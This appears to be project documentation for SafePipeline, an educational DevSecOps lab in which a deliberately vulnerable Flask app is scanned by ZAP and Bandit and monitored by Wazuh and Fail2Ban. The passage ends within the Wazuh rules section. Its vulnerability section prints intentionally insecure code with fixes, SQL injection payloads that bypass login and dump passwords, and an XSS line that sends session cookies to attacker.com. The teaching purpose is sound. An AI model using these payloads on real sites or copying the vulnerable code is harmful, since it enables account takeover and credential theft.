# SafePipeline — Complete Project Documentation
## A Full DevSecOps Platform: Build · Scan · Deploy · Defend

> **Educational project** — This application contains intentional vulnerabilities for security learning.
> Do not deploy in production.

---

# TABLE OF CONTENTS

1. [What is DevSecOps?](#1-what-is-devsecops)
2. [SafePipeline — Project Overview](#2-safepipeline--project-overview)
3. [The Deliberately Vulnerable Web Application](#3-the-deliberately-vulnerable-web-application)
4. [Docker — Containerization](#4-docker--containerization)
5. [Kubernetes — Container Orchestration](#5-kubernetes--container-orchestration)
6. [Terraform — Infrastructure as Code](#6-terraform--infrastructure-as-code)
7. [CI/CD Pipeline with GitHub Actions](#7-cicd-pipeline-with-github-actions)
8. [Security Stack: Wazuh, Fail2Ban, OWASP ZAP](#8-security-stack-wazuh-fail2ban-owasp-zap)
9. [Monitoring: Prometheus & Grafana](#9-monitoring-prometheus--grafana)
10. [Attack Simulations](#10-attack-simulations)
11. [Local Testing Guide](#11-local-testing-guide)
12. [Conclusion](#12-conclusion)

---

# 1. What is DevSecOps?

## 1.1 The Problem with Traditional Software Development

For decades, building and shipping software followed a sequential model with clear boundaries between teams:

- **Developers (Dev)** wrote the application code
- **Operations (Ops)** deployed that code onto servers and kept it running
- **Security (Sec)** reviewed the application for vulnerabilities — almost always at the very end, right before release

This model had a fundamental flaw: **security was always an afterthought**. When security teams discovered a critical vulnerability on the day before launch, fixing it required reworking code that had already been integrated, tested, and approved. The cost — in time, money, and risk — was enormous.

Think of it like building an entire house, then discovering on moving day that the foundations do not meet safety codes. You cannot simply add a few bricks to fix it; you may have to tear out walls.

## 1.2 The DevSecOps Solution: "Shift Left"

**DevSecOps** (Development + Security + Operations) solves this by integrating security at every stage of the software lifecycle, not just at the end. The guiding principle is called **"Shift Left"** — move security checks to the left side of the timeline, meaning as early as possible.

```
BEFORE (traditional waterfall approach):
Code → Review → Build → Test → Deploy → [Security checks everything]
                                          ↑ Problems found here are expensive

AFTER (DevSecOps):
Code → [SAST scan] → Build → [DAST scan] → Deploy → [Runtime monitoring]
  ↑                    ↑                      ↑              ↑
Secrets     Static code         Live app      Continuous
detection   analysis            scan          threat detection
```

Every time a developer saves code and pushes it to Git, an automated pipeline runs dozens of checks. If a vulnerability is introduced, it is caught within minutes — before it ever reaches production.

## 1.3 The Four Pillars of DevSecOps

| Pillar | What it means | How SafePipeline implements it |
|--------|---------------|-------------------------------|
| **Automation** | Every repetitive check runs automatically, no human needed | GitHub Actions CI/CD pipeline |
| **Visibility** | Know in real time what is happening in your systems | Prometheus metrics + Grafana dashboards |
| **Continuous security** | Test security on every code change, not once a year | Bandit (SAST) + OWASP ZAP (DAST) in the pipeline |
| **Incident response** | Detect attacks and react faster than a human ever could | Wazuh SIEM + Fail2Ban auto-blocking |

## 1.4 Why Does This Matter in the Real World?

According to IBM's Cost of a Data Breach Report, the average time to identify and contain a data breach is **277 days** in organizations without proper security automation. With DevSecOps practices, this can be reduced to hours. Every major cloud company (Netflix, Airbnb, Amazon) runs thousands of automated security checks per day. SafePipeline replicates this exact workflow at a learning scale.

---

# 2. SafePipeline — Project Overview

## 2.1 What Is SafePipeline?

SafePipeline is a complete, self-contained DevSecOps environment built to demonstrate how development, security, and operations work together in a real-world cloud-native setup. It is a working prototype — not a toy, but a real system with real tools.

At its center is a **deliberately vulnerable Flask web application** that serves as both the deployment target and the security testing ground. Around it, a full ecosystem of tools monitors, scans, detects, and blocks threats — just as a production system would.

**The key insight:** To learn defense, you must understand offense. By running controlled attacks against a purposefully broken application and watching the detection tools respond in real time, you build genuine intuition about how vulnerabilities work and why modern security controls are designed the way they are.

## 2.2 Global Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                    DEVELOPER WORKSTATION                     │
│          Write code → git commit → git push                  │
└─────────────────────────┬────────────────────────────────────┘
                          │ (triggers automatically)
                          ▼
┌──────────────────────────────────────────────────────────────┐
│                  GITHUB ACTIONS (CI/CD)                      │
│                                                              │
│  ① Build & Lint → ② Unit Tests → ③ SAST (Bandit)            │
│          ↓                                                   │
│  ④ Docker Build → ⑤ DAST (OWASP ZAP)                        │
│                                                              │
│  → Reports saved as pipeline artifacts                       │
└─────────────────────────┬────────────────────────────────────┘
                          │ (on success)
                          ▼
┌──────────────────────────────────────────────────────────────┐
│             LOCAL ENVIRONMENT (minikube)                     │
│                                                              │
│  ┌─────────────────┐  ┌──────────────────┐  ┌────────────┐  │
│  │  Flask App      │  │  Prometheus      │  │   Wazuh    │  │
│  │  port 5000      │  │  port 9090       │  │   SIEM     │  │
│  │  (vulnerable)   │  │  + Grafana 3000  │  │ + Fail2Ban │  │
│  └─────────────────┘  └──────────────────┘  └────────────┘  │
│                                                              │
│  Provisioned by Terraform · Orchestrated by Kubernetes       │
└──────────────────────────────────────────────────────────────┘
                          ↑
               Simulated attacks (brute force, SQLi, XSS, port scan)
```

## 2.3 Project Directory Structure

```
SafePipeline/
│
├── app/                         ← Web application (the target)
│   ├── app.py                   ← Flask routes + intentional vulnerabilities
│   ├── database.py              ← SQLite initialization
│   ├── requirements.txt         ← Python dependencies
│   ├── templates/               ← HTML pages (login, dashboard)
│   │   ├── login.html
│   │   └── dashboard.html
│   └── Dockerfile               ← Container build recipe
│
├── k8s/                         ← Kubernetes manifests (YAML)
│   ├── deployment.yaml          ← How to run the app in K8s
│   ├── service.yaml             ← How to expose the app
│   └── ingress.yaml             ← External access routing
│
├── infra/                       ← Terraform (Infrastructure as Code)
│   ├── main.tf                  ← Resources to create (K8s namespaces)
│   ├── variables.tf             ← Configurable parameters
│   └── outputs.tf               ← Information displayed after apply
│
├── monitoring/                  ← Metrics and visualization stack
│   ├── docker-compose.yml       ← Launches Prometheus + Grafana
│   ├── prometheus.yml           ← Metrics scraping config
│   └── dashboards/              ← Pre-built Grafana dashboards (JSON)
│
├── security/                    ← Security tooling
│   ├── wazuh/                   ← SIEM + intrusion detection
│   │   ├── docker-compose.yml
│   │   ├── custom-rules.xml     ← Custom detection rules for our app
│   │   └── config/              ← SSL certificates, indexer config
│   ├── fail2ban/                ← Automatic IP blocking
│   │   ├── jail.local           ← Jail configurations
│   │   └── filter.d/            ← Log parsing patterns
│   ├── zap/                     ← OWASP ZAP DAST scanner
│   │   ├── zap-automation.yaml  ← Automated scan config
│   │   └── zap-scan.sh          ← Manual scan script
│   └── attacks/                 ← Controlled attack scripts
│       ├── brute_force.sh
│       ├── sqli_test.sh
│       ├── xss_test.sh
│       └── portscan.sh
│
├── docs/                        ← Documentation
│   ├── SafePipeline_Documentation_Complete.md  ← This file
│   └── ATTACK_RUNBOOK.md        ← Step-by-step attack reproduction guide
│
└── .github/
    └── workflows/
        └── pipeline.yml         ← The full CI/CD pipeline definition
```

## 2.4 Team Responsibilities

| GitHub ID | Responsibilities |
|-----------|-----------------|
| @Annou91 | Flask app, Docker, CI/CD pipeline, Kubernetes, Terraform |
| @tisssam | Wazuh, Fail2Ban, OWASP ZAP, attack simulations |
| **Shared** | Repository structure, Prometheus/Grafana, peer reviews, documentation |

---

# 3. The Deliberately Vulnerable Web Application

## 3.1 Why Build a Vulnerable Application?

This is the most important question to answer before diving in. Security tools — scanners, SIEM systems, intrusion detection engines — need real threats to detect. An application with no vulnerabilities would produce no alerts, no scan findings, no log events. The tools would appear to work perfectly but actually have nothing to catch.

By building known, documented vulnerabilities into a controlled environment, we can:

1. **Verify that detection tools actually work** — if we inject SQL code and ZAP does not flag it, our scanner is misconfigured
2. **Practice real attack patterns** — understanding HOW an attack works is essential to understanding WHY the detection rule triggers
3. **Measure detection speed** — from attack launch to Wazuh alert, how many milliseconds does it take?

> **Analogy:** Military training ranges use real explosions and live fire in controlled conditions. The danger is real, but the environment is safe. SafePipeline is our training range.

## 3.2 The Technology: Flask (Python)

**Flask** is a lightweight web framework for Python. A "web framework" is a toolkit that handles the plumbing of web communication so developers can focus on application logic.

When a browser requests `http://localhost:5000/login`, Flask:
1. Receives the HTTP request
2. Matches the URL to a Python function (called a "route handler")
3. Executes that function
4. Returns the result as HTML to the browser

```python
from flask import Flask
app = Flask(__name__)      # Create the application

@app.route("/login")       # Register this URL pattern
def login():               # When /login is requested, run this function
    return "Login page"    # Return HTML to the browser
```

Flask is ideal for this project because it is minimal and transparent — every line of code has a clear purpose, which makes the vulnerabilities easy to see and understand.

## 3.3 The Database: SQLite

**SQLite** is a relational database stored in a single file (`users.db`). It uses SQL (Structured Query Language) to store and retrieve data.

Our database has one table called `users`:

```sql
CREATE TABLE users (
    id       INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL
);
```

With three test accounts pre-loaded:

| id | username | password  |
|----|----------|-----------|
| 1  | admin    | admin123  |
| 2  | alice    | password1 |
| 3  | bob      | letmein   |

**Intentional vulnerability:** Passwords are stored as plain text. In a real application, passwords must never be stored in a readable format. They should be transformed through a one-way **hashing** algorithm (like bcrypt or argon2) that turns the password into an irreversible fingerprint. Even if a database is stolen, the attacker cannot recover the original passwords from hashes.

The plain-text storage here is intentional — it makes the educational examples clearer and ensures our attack simulations work as expected.

## 3.4 Application Routes

The application has four URL endpoints:

| Route | Method | Purpose |
|-------|--------|---------|
| `/login` | GET, POST | Login form and authentication logic |
| `/dashboard` | GET | Protected user page (requires login) |
| `/api/users` | GET | JSON API to look up users by ID |
| `/logout` | GET | Clears the session and redirects to login |
| `/metrics` | GET | Prometheus metrics endpoint (auto-generated) |

## 3.5 The Three Intentional Vulnerabilities

### Vulnerability 1: SQL Injection (SQLi)

**What is SQL Injection?**

When an application builds database queries by directly concatenating user-provided text, an attacker can insert SQL code into that text, changing the intent of the query entirely.

**The vulnerable code** (in `app.py`, `/login` route):

```python
# USER INPUT goes directly into the SQL string — NEVER do this
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

**Normal usage** — a user types `admin` / `admin123`:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
-- → Returns the admin row → login succeeds
```

**Attack** — the attacker types `admin'--` as the username, anything as password:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
--                                           ↑ Everything after -- is a SQL comment
--                                             The password check is completely ignored
-- → Returns the admin row → login succeeds WITHOUT knowing the password
```

The attacker is now logged in as `admin` without ever knowing the password. They exploited the fact that the application trusted user input without validation.

**More dangerous payload** — dumping the entire user table via the `/api/users` endpoint:
```
GET /api/users?id=0 UNION SELECT 1,username||':'||password FROM users
```
This modifies the query to return every username and password in the database.

**The secure fix** — parameterized queries (also called prepared statements):
```python
# Safe: user input is passed as a parameter, never concatenated into SQL
cursor.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password)
)
```
With parameterized queries, the database treats user input as data, never as code. The injection is impossible.

### Vulnerability 2: Cross-Site Scripting (XSS)

**What is XSS?**

Cross-Site Scripting allows an attacker to inject malicious JavaScript into a web page that other users will see. When that JavaScript runs in the victim's browser, it has full access to the page, cookies, and local storage.

**The vulnerable code** (in `app.py`, `/dashboard` route):

```python
message = request.args.get("message", "")   # Read from URL parameter
return render_template("dashboard.html", user=session["user"], message=message)
```

And in the HTML template (`dashboard.html`):
```html
<!-- The | safe filter tells Flask: "trust this content, don't escape it" -->
<p>{{ message | safe }}</p>
```

**Normal usage** — a user visits `/dashboard?message=Welcome`:
```html
<p>Welcome</p>
<!-- Renders as text — harmless -->
```

**Attack** — an attacker crafts a URL:
```
http://localhost:5000/dashboard?message=<script>alert('XSS')</script>
```

The page renders:
```html
<p><script>alert('XSS')</script></p>
```
The browser executes the JavaScript. A popup appears. This proves arbitrary code executes.

**Real-world consequence** — instead of a harmless alert, an attacker sends this URL to a victim:
```
/dashboard?message=<script>
  document.location='https://attacker.com/steal?c='+document.cookie
</script>
```
When the victim clicks the link, their session cookie is sent to the attacker's server. The attacker uses that cookie to impersonate the victim without ever needing their password.

**The secure fix** — never use `| safe` with user-supplied content:
```html
<!-- Safe: Flask automatically HTML-encodes the content -->
<p>{{ message }}</p>
<!-- <script> becomes &lt;script&gt; — harmless text, not executable code -->
```

### Vulnerability 3: Weak Authentication (Brute Force)

**What is a brute force attack?**

When an application has no limit on login attempts, an attacker can try millions of password combinations automatically until one succeeds. This is called a brute force attack.

**The vulnerability in our app:**
- No rate limiting on the `/login` endpoint
- No account lockout after multiple failures
- Passwords are short and common (admin123, letmein)

An automated tool like Hydra can try hundreds of username/password combinations per second. Given the weak passwords in our test database, a brute force attack succeeds in seconds.

**Why this exists:** The weak authentication is the trigger for testing **Fail2Ban**. We want to see the automatic IP-blocking mechanism activate after five failed attempts.

## 3.6 Structured Security Logging

The application does not just respond to requests — it generates structured log entries for every security-relevant event. These logs are the input that Wazuh and Fail2Ban read to detect attacks.

```python
def log_event(event, **kwargs):
    entry = {
        "app": "safepipeline",
        "event": event,
        "src_ip": request.remote_addr   # The attacker's IP address
    }
    entry.update(kwargs)               # Add any extra fields (username, payload)
    security_logger.info(json.dumps(entry))   # Write as JSON to app.log
```

**Example log entries:**

| Action | Log written |
|--------|-------------|
| Failed login | `{"app":"safepipeline","event":"login_failed","src_ip":"192.168.1.5","username":"admin"}` |
| SQL injection | `{"app":"safepipeline","event":"sqli_attempt","src_ip":"192.168.1.5","param":"id","value":"1 OR 1=1"}` |
| XSS attempt | `{"app":"safepipeline","event":"xss_attempt","src_ip":"192.168.1.5","payload":"<script>..."}` |
| Successful login | `{"app":"safepipeline","event":"login_success","src_ip":"192.168.1.5","username":"admin"}` |

These JSON logs are written to `/var/log/safepipeline/app.log` inside the container. Wazuh reads this file in real time and applies detection rules. Fail2Ban also watches the file and counts failure events per IP.

---

# 4. Docker — Containerization

## 4.1 The Problem Docker Solves

Imagine you build a Python application on your laptop running Windows. You send the code to a colleague. They have a Mac with a different Python version and different libraries installed. It breaks. "It works on my machine" is a joke in the development world because it happens constantly.

Docker solves this by bundling the application together with everything it needs — the language runtime, the libraries, the configuration files — into a single portable unit called a **container**.

**Analogy:** Think of shipping containers on cargo ships. Before standardized containers, every ship had to load cargo in custom ways. Standardized containers can go onto any ship, any truck, any train — the infrastructure adapts to the container, not the other way around. Docker containers work exactly like this for software.

## 4.2 Key Docker Concepts

| Concept | Analogy | What it is |
|---------|---------|-----------|
| **Dockerfile** | Recipe | Instructions for building an image |
| **Image** | Frozen snapshot | A read-only package containing the app and all its dependencies |
| **Container** | Running instance | A live, running copy of an image |
| **Registry** | App store | A repository where images are stored and shared (Docker Hub, GitHub Container Registry) |
| **Volume** | Shared folder | A way to persist data outside the container's lifecycle |

## 4.3 Our Dockerfile — Line by Line

Here is the full Dockerfile from `app/Dockerfile`, explained:

```dockerfile
# Start from an official Python image (lightweight variant)
FROM python:3.11-slim
```
> We inherit from an existing image that already has Python 3.11 installed. `slim` means it is stripped of unnecessary tools, keeping the image small (the smaller the image, the less surface area for attacks).

```dockerfile
# Set the working directory inside the container
WORKDIR /app
```
> All subsequent commands execute from `/app`. When the container starts, this is the current directory.

```dockerfile
# Copy only the dependency list first
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
```
> **Why copy requirements.txt before the code?** Docker builds in layers. If requirements.txt does not change between builds, Docker reuses the cached layer — the pip install step is skipped entirely. This makes rebuilds after code changes much faster.

```dockerfile
# Now copy the rest of the application code
COPY . .
```
> Copies `app.py`, `database.py`, `templates/`, and `users.db` into the container.

```dockerfile
# Tell Docker which port this app listens on (documentation)
EXPOSE 5000
```
> This does not actually open a port — it is metadata. Port mapping happens when you run `docker run -p 5000:5000`.

```dockerfile
# The command that runs when the container starts
CMD ["python", "app.py"]
```
> Launches the Flask application. The app calls `app.run(host="0.0.0.0", port=5000)` so it accepts connections from outside the container.

## 4.4 Building and Running the Container

```bash
# Build the image from the Dockerfile in ./app
docker build -t safepipeline-app ./app

# Run a container from that image, exposing port 5000
docker run -d -p 5000:5000 --name safepipeline safepipeline-app

# View logs from the container
docker logs safepipeline -f

# Stop and remove the container
docker stop safepipeline && docker rm safepipeline
```

The `-d` flag runs in detached mode (background). The `-p 5000:5000` maps port 5000 on your machine to port 5000 inside the container.

## 4.5 Why Docker in This Project?

1. **Reproducibility** — anyone with Docker installed can run the app with one command, regardless of their OS
2. **Isolation** — the vulnerable app runs in its own sandbox, not polluting the host system
3. **CI/CD integration** — GitHub Actions builds a new Docker image on every commit and runs the ZAP scan against it
4. **Kubernetes compatibility** — Kubernetes deploys Docker containers; Docker is the prerequisite for K8s

---

# 5. Kubernetes — Container Orchestration

## 5.1 From Docker to Kubernetes: Why?

Docker runs **one container**. What happens when you need **hundreds** of containers serving millions of users? What happens when a container crashes? Who restarts it? How do you update the application without downtime?

Kubernetes (K8s) answers all of these questions. It is a **container orchestration platform** — a system that manages where containers run, how many are running, how they communicate, and how they recover from failures.

**Analogy:** If Docker is a musician, Kubernetes is the conductor of the orchestra. The conductor ensures every musician plays their part at the right time, handles replacements when someone gets sick, and coordinates the entire performance.

## 5.2 Core Kubernetes Concepts

### Cluster and Nodes

A Kubernetes **cluster** is a group of machines (physical or virtual) called **nodes**. In our project, we use **minikube**, which creates a single-node cluster on your local machine — a full Kubernetes environment running locally for development.

### Pods

A **Pod** is the smallest deployable unit in Kubernetes. It wraps one or more containers that share network and storage. Think of a Pod as a container wrapper with a stable identity inside the cluster.

### The Three YAML Files

**1. Deployment (`k8s/deployment.yaml`)** — tells K8s what to run and how many copies:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: safepipeline-app
spec:
  replicas: 1          # Run exactly 1 copy of the app
  selector:
    matchLabels:
      app: safepipeline
  template:
    spec:
      containers:
        - name: safepipeline-app
          image: safepipeline-app:latest   # Docker image to use
          imagePullPolicy: Never           # Use local image (for minikube)
          ports:
            - containerPort: 5000
```

If the Pod crashes, Kubernetes immediately creates a replacement to maintain the `replicas: 1` count. This is **self-healing**.

**2. Service (`k8s/service.yaml`)** — creates a stable network endpoint for the Pods:

```yaml
apiVersion: v1
kind: Service
metadata:
  name: safepipeline-service
spec:
  selector:
    app: safepipeline     # Routes traffic to Pods with this label
  ports:
    - port: 80
      targetPort: 5000
  type: NodePort          # Exposes the service on a port on the node
```

Why do we need a Service? Pod IP addresses change every time a Pod restarts. A Service has a **stable IP and name** that never changes, regardless of which Pod is actually serving requests.

**3. Ingress (`k8s/ingress.yaml`)** — routes external HTTP traffic into the cluster:

The Ingress acts as a reverse proxy (similar to Nginx) that sits in front of all Services. It routes incoming requests to the correct Service based on the URL path or hostname.

## 5.3 Key Benefits in Our Project

| Scenario | Without Kubernetes | With Kubernetes |
|----------|-------------------|-----------------|
| App crash | App stays down until someone manually restarts it | K8s detects the failure and restarts within seconds |
| Traffic spike | App is overwhelmed | Scale replicas from 1 to 10 with one command |
| App update | Brief downtime during restart | Rolling update: new pods start before old ones stop |
| Multi-service coordination | Complex manual setup | Services discover each other by name automatically |

## 5.4 Kubernetes Commands for This Project

```bash
# Apply all manifests in the k8s/ directory
kubectl apply -f k8s/

# Watch pods start up in real time
kubectl get pods -w

# Get the URL to access the app (minikube)
minikube service safepipeline-service --url

# View logs from the app pod
kubectl logs -l app=safepipeline -f

# Delete all resources
kubectl delete -f k8s/
```

---

# 6. Terraform — Infrastructure as Code

## 6.1 What is Infrastructure as Code?

Traditional infrastructure management meant logging into a server or a cloud console and manually clicking through menus to create resources — namespaces, databases, load balancers, permissions. This approach has serious problems:

- **Not reproducible** — no written record of what was created or why
- **Not auditable** — you cannot track who changed what, and when
- **Error-prone** — humans make mistakes when clicking through UI interfaces
- **Not scalable** — you cannot manually recreate 50 resources in a new environment

**Infrastructure as Code (IaC)** means writing infrastructure configuration in text files that can be version-controlled, reviewed, tested, and applied automatically. Just as code is the source of truth for an application, IaC files are the source of truth for the infrastructure.

**Terraform** is the most widely used IaC tool. It supports hundreds of providers (AWS, Azure, GCP, Kubernetes, GitHub, and more).

## 6.2 How Terraform Works

Terraform follows a simple workflow:

```
① Write    →    ② Plan    →    ③ Apply
.tf files        Preview        Create/Update/Delete
                 changes        real resources
```

- **`terraform init`** — downloads the required provider plugins
- **`terraform plan`** — shows what will be created, changed, or destroyed
- **`terraform apply`** — actually creates/updates the resources
- **`terraform destroy`** — deletes everything managed by this configuration

Terraform tracks what it has created in a **state file** (`terraform.tfstate`). This file is Terraform's memory — it knows which resources exist so it can update them efficiently instead of recreating from scratch every time.

## 6.3 Our Terraform Configuration

SafePipeline uses Terraform to provision Kubernetes **namespaces** — logical boundaries within the cluster that separate resources by purpose.

**`infra/main.tf`** creates three namespaces:

```hcl
# Provider: connect to the local minikube cluster
provider "kubernetes" {
  config_path    = var.kubeconfig_path   # Path to ~/.kube/config
  config_context = var.kube_context      # "minikube"
}

# Namespace for the application
resource "kubernetes_namespace" "app" {
  metadata {
    name = "safepipeline-app"
    labels = {
      project     = "safepipeline"
      environment = "dev"
    }
  }
}

# Namespace for monitoring tools
resource "kubernetes_namespace" "monitoring" {
  metadata { name = "safepipeline-monitoring" }
}

# Namespace for security tools
resource "kubernetes_namespace" "security" {
  metadata { name = "safepipeline-security" }
}
```

**Why use namespaces?**

Namespaces prevent different workloads from interfering with each other. The app lives in `safepipeline-app`, Prometheus and Grafana live in `safepipeline-monitoring`, and Wazuh lives in `safepipeline-security`. Each namespace has its own resource quotas, access controls, and network policies.

## 6.4 Variables and Outputs

**`infra/variables.tf`** — configurable parameters (can be overridden without editing main.tf):

```hcl
variable "kube_context" {
  description = "Kubernetes context to use"
  default     = "minikube"
}

variable "app_namespace" {
  default = "safepipeline-app"
}
```

**`infra/outputs.tf`** — displays useful information after `terraform apply`:

```hcl
output "app_namespace" {
  value       = kubernetes_namespace.app.metadata[0].name
  description = "Application namespace"
}
```

## 6.5 Why Terraform Instead of kubectl?

You could create namespaces with `kubectl create namespace safepipeline-app`. But:

- `kubectl` commands are not recorded anywhere (no version control)
- Terraform state tracks what exists, so you can run `terraform plan` at any time to see if your infrastructure has drifted from the desired state
- Terraform can manage resources across multiple systems in a single file (K8s + AWS + DNS all at once)
- The same Terraform code can deploy to dev, staging, and production just by changing variable values

---

# 7. CI/CD Pipeline with GitHub Actions

## 7.1 What is CI/CD?

**CI (Continuous Integration)** means that every code change is automatically integrated, built, and tested — continuously, not just before releases.

**CD (Continuous Delivery/Deployment)** means that code which passes all checks can be automatically delivered to users, without a human having to manually deploy it.

**Why?** Without CI/CD, developers integrate their code infrequently, leading to painful "merge hell" when diverged branches conflict. Without automated tests and scans, bugs and vulnerabilities slip through. CI/CD eliminates this by making integration, testing, and security validation automatic and instant.

**GitHub Actions** is GitHub's built-in CI/CD platform. It runs pipelines (called **workflows**) defined in YAML files inside `.github/workflows/`. Every trigger — a push, a pull request, a scheduled event — can launch a workflow.

## 7.2 Our Pipeline: Five Jobs

The pipeline is defined in `.github/workflows/pipeline.yml` and runs on every push to `main` and every pull request targeting `main`.

```
git push
    │
    ▼
① build ──────────────────────────────────────────────────────┐
    │                                                          │
    ▼                           ▼                             │
② test                      ③ sast (Bandit)                  │
    │                           │                             │
    └───────────┬───────────────┘                             │
                ▼                                             │
           ④ docker-build                                    │
                │                                             │
                ▼                                             │
           ⑤ zap-scan (DAST)                                 │
                │                                             │
                ▼                                             │
           Artifacts: HTML/JSON/MD reports ◄──────────────────┘
```

### Job 1: Build & Lint

**Purpose:** Verify the code is syntactically correct and follows style conventions. If this fails, there is no point running anything else.

```yaml
build:
  name: Build & Lint
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4          # Download the code
    - uses: actions/setup-python@v5      # Install Python 3.11
      with:
        python-version: "3.11"
    - run: pip install -r app/requirements.txt   # Install dependencies
    - run: |
        pip install flake8
        flake8 app/ --max-line-length=120        # Run the linter
```

**Flake8** is a Python linter (code quality checker). It catches:
- Syntax errors
- Unused imports
- Lines that are too long
- Inconsistent indentation

This job catches basic code quality issues in seconds, before any developer has to review the code.

### Job 2: Unit Tests

**Purpose:** Verify that the application logic behaves correctly. Tests document expected behavior and catch regressions.

```yaml
test:
  needs: build        # Only runs if "build" succeeded
  steps:
    - run: pytest app/tests/ -v || echo "No tests yet — skipping"
```

The `needs: build` directive creates a **dependency chain** — jobs run in sequence or in parallel based on their dependencies. Test only runs if the build passed. If there are no tests yet, the pipeline continues (the `|| echo` prevents failure).

### Job 3: SAST — Static Application Security Testing

**Purpose:** Analyze the source code for known security vulnerabilities without running it. This is "reading the code" for security issues.

```yaml
sast:
  needs: build
  steps:
    - run: pip install bandit
    - run: bandit -r app/ -ll --exclude app/__pycache__ || true
```

**Bandit** is a Python security linter. It scans for:
- Hardcoded passwords or API keys
- Use of dangerous functions (`exec`, `eval`)
- Weak cryptography (MD5, SHA1)
- SQL injection patterns
- Insecure use of subprocess

On our app, Bandit will flag the SQL injection patterns, the hardcoded `secret_key`, and the plain-text password storage. We add `|| true` so the job does not fail (the vulnerabilities are intentional), but the findings are still logged.

**Why SAST?** Static analysis catches issues that dynamic testing might miss — for example, a vulnerable code path that is never triggered during testing. It also runs instantly, before any code is deployed anywhere.

### Job 4: Docker Build

**Purpose:** Verify the Dockerfile is valid and the entire application packages correctly into a container.

```yaml
docker-build:
  needs: [test, sast]     # Runs only if both test and sast passed
  steps:
    - run: docker build -t safepipeline-app:${{ github.sha }} ./app
```

The image is tagged with the **commit SHA** (`github.sha`) — a unique 40-character identifier for the specific commit being built. This enables precise traceability: if a problem appears in production, you can identify exactly which code version is running.

### Job 5: DAST — Dynamic Application Security Testing (OWASP ZAP)

**Purpose:** Test the running application by sending real HTTP requests, attempting real attacks, and finding vulnerabilities that only appear at runtime.

```yaml
zap-scan:
  needs: docker-build
  steps:
    # 1. Start the application
    - run: |
        docker build -t safepipeline-app ./app
        docker run -d -p 5000:5000 --name target safepipeline-app
        sleep 5

    # 2. Run ZAP full scan against the live app
    - run: |
        docker run --rm \
          -v ${{ github.workspace }}:/zap/wrk/:rw \
          --network=host \
          ghcr.io/zaproxy/zaproxy:stable \
          zap-full-scan.py \
          -t http://localhost:5000 \
          -J report_json.json \
          -w report_md.md \
          -r report_html.html \
          -I

    # 3. Save the reports
    - uses: actions/upload-artifact@v4
      with:
        name: zap_report
        path: report_html.html

    # 4. Stop the app
    - run: docker stop target && docker rm target
```

ZAP acts like an automated attacker: it crawls every page, tries SQL injection on every input field, checks HTTP headers for security configurations, and tests for dozens of vulnerability categories from the OWASP Top 10.

**`continue-on-error: true`** — the ZAP job is allowed to fail without blocking the pipeline. This is because our app has intentional vulnerabilities that ZAP will correctly detect. In a real project, this would be `false` and the pipeline would fail on any high-severity finding.

The HTML, JSON, and Markdown reports are stored as **pipeline artifacts** that can be downloaded from the GitHub Actions interface and reviewed.

## 7.3 The Full Flow on Every Push

1. Developer writes code locally and runs `git push`
2. GitHub receives the push and triggers the workflow
3. GitHub spins up a fresh Ubuntu virtual machine (`ubuntu-latest`)
4. All five jobs run (build → test+sast in parallel → docker build → zap scan)
5. Results are reported on the pull request or commit page
6. ZAP reports are available to download
7. The entire pipeline takes approximately 5–10 minutes

---

# 8. Security Stack: Wazuh, Fail2Ban, OWASP ZAP

## 8.1 The Defense-in-Depth Philosophy

No single security tool can protect a system. Professional security architectures use **multiple layers** of controls, each catching what the others miss. This is called **defense in depth**.

In SafePipeline, the security stack has three layers:

```
Prevention   →   Detection    →   Response
  (ZAP             (Wazuh          (Fail2Ban
   finds            sees            blocks
   vulns in        attacks          the IP)
   the code)       in logs)
```

## 8.2 OWASP ZAP — Dynamic Vulnerability Scanner

**What it is:** OWASP ZAP (Zed Attack Proxy) is an open-source web application security scanner maintained by the Open Worldwide Application Security Project. It is used by security professionals worldwide and is the de facto standard for automated DAST testing.

**How it works:**
1. ZAP acts as a proxy between itself and the application
2. It crawls every reachable page and endpoint
3. For each input point (forms, URL parameters, headers), it sends malformed and malicious payloads
4. It records every response and analyzes it for signs of vulnerability
5. It generates a report categorizing findings by severity (High, Medium, Low, Informational)

**In SafePipeline:** ZAP runs in the CI/CD pipeline as a Docker container. It finds:
- SQL injection in `/login` and `/api/users`
- Reflected XSS in `/dashboard`
- Missing security headers (Content-Security-Policy, X-Frame-Options, etc.)
- Insecure session cookie configuration

**Reports:** After every pipeline run, three report formats are available:
- `report_html.html` — interactive visual report for humans
- `report_json.json` — machine-readable report for integration with other tools
- `report_md.md` — Markdown report for direct embedding in GitHub issues

The ZAP configuration for automated scanning is in `security/zap/zap-automation.yaml`.

## 8.3 Wazuh — SIEM and Intrusion Detection

**What is a SIEM?**

SIEM stands for **Security Information and Event Management**. It is the central nervous system of a security operations center. A SIEM:
- **Collects** logs from every system (servers, applications, network devices)
- **Normalizes** them into a common format
- **Correlates** events across different sources
- **Alerts** when combinations of events match known attack patterns
- **Stores** everything for forensic investigation

**What is Wazuh?**

Wazuh is an open-source SIEM and security platform. It is the professional alternative to expensive commercial products like Splunk or IBM QRadar. It includes:
- A **manager** that processes rules and generates alerts
- An **indexer** (based on OpenSearch) that stores and searches logs
- A **dashboard** that visualizes alerts and lets analysts investigate

**Custom Detection Rules** (`security/wazuh/custom-rules.xml`):

Wazuh uses XML-based rules to detect threats. We wrote five custom rules specifically for our application:

```xml
<!-- Rule 100001: Base rule — match any log from our app -->
<rule id="100001" level="0">
  <decoded_as>json</decoded_as>
  <field name="app">safepipeline</field>
</rule>

<!-- Rule 100002: Single failed login — level 5 (minor alert) -->
<rule id="100002" level="5">
  <if_sid>100001</if_sid>
  <field name="event">login_failed</field>
  <description>SafePipeline: failed login for user $(username)</description>
</rule>

<!-- Rule 100003: BRUTE FORCE — 5 failures in 60s — level 10 (high alert) -->
<rule id="100003" level="10" frequency="5" timeframe="60">
  <if_matched_sid>100002</if_matched_sid>
  <same_field>src_ip</same_field>    <!-- Same IP must trigger all 5 -->
  <description>Brute force attack from $(src_ip)</description>
</rule>

<!-- Rule 100004: SQL injection detected — level 12 (critical) -->
